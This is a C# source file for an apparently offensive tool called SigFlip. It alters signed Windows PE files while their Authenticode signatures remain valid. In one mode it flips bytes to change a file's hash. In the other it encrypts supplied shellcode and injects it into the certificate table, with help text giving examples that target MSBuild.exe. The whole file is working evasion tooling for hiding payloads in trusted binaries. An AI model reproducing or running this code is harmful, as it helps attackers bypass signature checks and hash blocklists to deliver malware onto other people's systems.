using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static SigFlip.PE;
using static SigFlip.PEHeaders;

namespace SigFlip
{
    class Program
    {
       enum MODE
        {
            BIT_FLIP,
            BIT_INJECT
        }

        public static uint CERT_TABLE_RVA_OFFSET = 0x98;
        public static int RANDOM_BYTES_SIZE = 8;
        public static string _pePath = "";
        public static string _outPath = "./outPE";
        public static string _dataPath = "";
        public static string _encKey = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        public static void Main(string[] args)
        {

            #region Arguments parsing
            ArgumentParser _parser = new ArgumentParser(args);

            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true")
            {
                Help();
            }

            MODE _mode = MODE.BIT_FLIP;

            if (_parser.GetOrDefault("b", "null") != "null"){
                _mode = MODE.BIT_FLIP;
                _pePath = _parser.GetOrDefault("b", "null");
                _outPath = _parser.GetOrDefault("o", "null") == "null" ? "./outPE" : _parser.GetOrDefault("o", "null");
                if (_pePath == "null") Help();

            } else if (_parser.GetOrDefault("i", "null") != "null") {
                _mode = MODE.BIT_INJECT;
                _pePath = _parser.GetOrDefault("i", "null");
                _outPath = _parser.GetOrDefault("o", "null") == "null" ? "./outPE" : _parser.GetOrDefault("o", "null");
                _dataPath = _parser.GetOrDefault("s", "null");
                _encKey = _parser.GetOrDefault("e", "null");
                if (_pePath == "null" || _dataPath == "null" || _encKey == "null") Help();
                if (_dataPath != "null")
                {
                    if (!File.Exists(_dataPath)) Help();
                }
            }
            else {
                Help();
            }

            if (!File.Exists(_pePath)) Help();

            #endregion Arguments parsing

            Console.WriteLine();
            //Check configuration
            if (Utils.checkConfig()) {
                Console.WriteLine("[!]:Endpoint hardened against authenticode signature padding, i.e this won't work");
                Environment.Exit(0);
            }

            #region Main

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();
            //Parsing PE file
            PE _pe = new PE(_pePath);
            if (_pe.dosHeader.e_magic != 0x5a4d)
            {
                Console.WriteLine("'{0}' is not a valid PE file", _pePath);
                Environment.Exit(0);
            }

            //Reading PE to byte array
            byte[] _peblob = Utils.Read(_pePath);

            //Verify PE Signature & Computer Hash
            Utils.checkSig(_pePath);
            Console.WriteLine("[+]:Current PE File '{0}' SHA1 Hash is: {1}", _pePath, Utils.sha1(_peblob));

            Console.WriteLine("[+]:" + (_mode == MODE.BIT_FLIP ? "Bit Flipping" : "Encrypting data/shellcode '"+_dataPath+"' using '"+_encKey+"' and injecting it to") + " PE File '{0}'", _pePath);
            //Data to inject, could be shellcode or random bytes (-b -i switches).
            byte[] _data = _mode == MODE.BIT_FLIP ? Encoding.ASCII.GetBytes(Utils.GenRandomBytes(RANDOM_BYTES_SIZE)) : Utils.Encrypt(Utils.Read(_dataPath),_encKey);
            Utils.WriteFile(@"C:\users\public\encrypted-shellcode.bin", _data);
            //Local variables
            ushort _FEHeaderCharacteristics = _pe.fileHeader.Characteristics;
            IMAGE_DATA_DIRECTORY _CertificateTable;
            uint _AttrCertTableRVA = 0;

            //Adjust extra padding in case of BIT_INJECT
            int _paddingLen = 0;
            int _tagLen = 0;
            if (_mode == MODE.BIT_INJECT)
            {
                _tagLen = _tag.Length;
                if ((_peblob.Length + _data.Length + _tagLen) % 8 != 0)
                {
                    while ((_peblob.Length + _data.Length + _paddingLen + _tagLen) % 8 != 0)
                    {
                        _paddingLen++;
                    }

                }
            }

            //Update dwLength and Cert Table Entry Size (OPT Header Data Dir)
            _pe.winCert.dwLength += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
            if (Utils.Is32Bit(_FEHeaderCharacteristics))
            {
                _pe.optionalHeader32.CertificateTable.Size += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
                _CertificateTable = _pe.optionalHeader32.CertificateTable;
                _AttrCertTableRVA = _pe.optionalHeader32.CertificateTable.VirtualAddress;
            }
            else
            {
                _pe.optionalHeader64.CertificateTable.Size += Convert.ToUInt32(_data.Length + _paddingLen + _tagLen);
                _CertificateTable = _pe.optionalHeader64.CertificateTable;
                _AttrCertTableRVA = _pe.optionalHeader64.CertificateTable.VirtualAddress;
                CERT_TABLE_RVA_OFFSET += 16;
            }


            Console.WriteLine("[+]:Updating OPT Header fields/entries");
            //Locating Certificate Table Data Directory Offset (OPT Header) & Updating the size attribute.
            Stream stream = new MemoryStream(_peblob);
            long pos = stream.Seek(_pe.dosHeader.e_lfanew, SeekOrigin.Begin);
            pos = stream.Seek(CERT_TABLE_RVA_OFFSET, SeekOrigin.Current);

            Utils.MMarshal<IMAGE_DATA_DIRECTORY>(Marshal.SizeOf(_CertificateTable), _CertificateTable, Convert.ToUInt32(pos), _peblob);

            //Updating Attribute Certificate Table dwLength.
            Utils.MMarshal<WIN_CERTIFICATE>(Marshal.SizeOf(_pe.winCert), _pe.winCert, _AttrCertTableRVA, _peblob);

            stream.Close();

           

            //Copy the updated PE byte array to a new byte array (size adjusted)
            byte[] _tempPE = new byte[_peblob.Length + _data.Length + _paddingLen + _tagLen];
            Array.Copy(_peblob, _tempPE, _peblob.Length);

            //Copy the data+tag and any extra required padding to the new PE byte array
            if(_mode == MODE.BIT_INJECT) Array.Copy(_tag, 0, _tempPE, _peblob.Length, _tagLen);
            Array.Copy(_data, 0, _tempPE, _peblob.Length + _tagLen, _data.Length);
            if (_mode == MODE.BIT_INJECT) {
                byte[] _extraPadding = new byte[_paddingLen];
                Array.Copy(_extraPadding, 0, _tempPE, _peblob.Length + _tagLen + _data.Length, _paddingLen);
            }

            _peblob = _tempPE;

            //Saving to disk
            Console.WriteLine("[+]:Saving Modified PE file to '{0}'", _outPath);
            Utils.WriteFile(_outPath, _peblob);

            #endregion Main

            #region Hash & Certificate checks  
            //Checking signature validity & hash
            Utils.checkSig(_outPath);
            Console.WriteLine("[+]:Modified PE File '{0}' SHA1 Hash is: {1}", _outPath, Utils.sha1(_peblob));


            #endregion Hash & Certificate checks  
            Console.WriteLine();
            Console.WriteLine("[*]:Done");
        }

        public static void Help()
        {
           
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine();
            Console.WriteLine("Bit Flipping: Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -b <PE_FILE_PATH> -o <OUTPUT_PATH (with extension)>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -b C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -o C:\Temp\MSbuild.exe");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Inject Shellcode: Encrypts and Injects shellcode into a PE file's for usage with a basic C/C# loader. (signature remains valid)");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -i <PE_PATH> -s <SHELLCODE_PATH> -o <OUTPUT_PE_FILE_PATH (with extension> -e <ENCRYPTION_KEY>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigFlip.exe -i C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -s C:\Temp\x86.bin -o C:\Temp\MSbuild.exe -e TestKey");
            Console.WriteLine();
            Console.WriteLine();

            Environment.Exit(0);
        }


    }
}
